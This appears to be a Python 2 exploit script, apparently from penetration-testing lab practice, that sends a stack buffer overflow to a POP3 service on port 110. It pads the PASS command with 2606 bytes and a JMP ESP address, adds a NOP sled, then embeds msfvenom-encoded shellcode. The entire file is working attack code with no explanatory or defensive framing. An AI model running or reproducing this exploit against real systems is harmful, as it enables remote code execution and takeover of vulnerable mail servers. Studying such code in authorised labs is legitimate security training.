#!/usr/bin/python
import socket

ip_address = "198.51.100.35"
rport= 110

buf = ("\xbf\x21\xa6\xd2\xa7\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x7a\x12\x03\x7a\x12\x83\xe3\xa2\x30\x52\x1f\x42\x36"
"\x9d\xdf\x93\x57\x17\x3a\xa2\x57\x43\x4f\x95\x67\x07\x1d\x1a"
"\x03\x45\xb5\xa9\x61\x42\xba\x1a\xcf\xb4\xf5\x9b\x7c\x84\x94"
"\x1f\x7f\xd9\x76\x21\xb0\x2c\x77\x66\xad\xdd\x25\x3f\xb9\x70"
"\xd9\x34\xf7\x48\x52\x06\x19\xc9\x87\xdf\x18\xf8\x16\x6b\x43"
"\xda\x99\xb8\xff\x53\x81\xdd\x3a\x2d\x3a\x15\xb0\xac\xea\x67"
"\x39\x02\xd3\x47\xc8\x5a\x14\x6f\x33\x29\x6c\x93\xce\x2a\xab"
"\xe9\x14\xbe\x2f\x49\xde\x18\x8b\x6b\x33\xfe\x58\x67\xf8\x74"
"\x06\x64\xff\x59\x3d\x90\x74\x5c\x91\x10\xce\x7b\x35\x78\x94"
"\xe2\x6c\x24\x7b\x1a\x6e\x87\x24\xbe\xe5\x2a\x30\xb3\xa4\x22"
"\xf5\xfe\x56\xb3\x91\x89\x25\x81\x3e\x22\xa1\xa9\xb7\xec\x36"
"\xcd\xed\x49\xa8\x30\x0e\xaa\xe1\xf6\x5a\xfa\x99\xdf\xe2\x91"
"\x59\xdf\x36\x35\x09\x4f\xe9\xf6\xf9\x2f\x59\x9f\x13\xa0\x86"
"\xbf\x1c\x6a\xaf\x2a\xe7\xfd\x10\xaa\xe5\xe4\xf8\xa9\xe9\x17"
"\x42\x24\x0f\x7d\xa4\x61\x98\xea\x5d\x28\x52\x8a\xa2\xe6\x1f"
"\x8c\x29\x05\xe0\x43\xda\x60\xf2\x34\x2a\x3f\xa8\x93\x35\x95"
"\xc4\x78\xa7\x72\x14\xf6\xd4\x2c\x43\x5f\x2a\x25\x01\x4d\x15"
"\x9f\x37\x8c\xc3\xd8\xf3\x4b\x30\xe6\xfa\x1e\x0c\xcc\xec\xe6"
"\x8d\x48\x58\xb7\xdb\x06\x36\x71\xb2\xe8\xe0\x2b\x69\xa3\x64"
"\xad\x41\x74\xf2\xb2\x8f\x02\x1a\x02\x66\x53\x25\xab\xee\x53"
"\x5e\xd1\x8e\x9c\xb5\x51\xbe\xd6\x97\xf0\x57\xbf\x42\x41\x3a"
"\x40\xb9\x86\x43\xc3\x4b\x77\xb0\xdb\x3e\x72\xfc\x5b\xd3\x0e"
"\x6d\x0e\xd3\xbd\x8e\x1b")
#Bad chars \x00\x0a\x0d for msfvenom

if __name__ == '__main__':
	

	
	buffer = 'A'*2606 + '\x8f\x35\x4a\x5f' + '\x90'*16 + buf 
#2606 for our offset, "\x8f\x35\x4a\x5f" for JMP ESP, enough NOPS to account for shellcode

	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip_address,rport))

		s.recv(1024)

		s.send('USER root\r\n')
		s.recv(1024)
		s.send('PASS ' + buffer + '\r\n')
		s.recv(1024)
		print 'Payload sent successfully'
		s.close()
	except Exception as err:
		print "Failed to send! Error: {}".format(err)

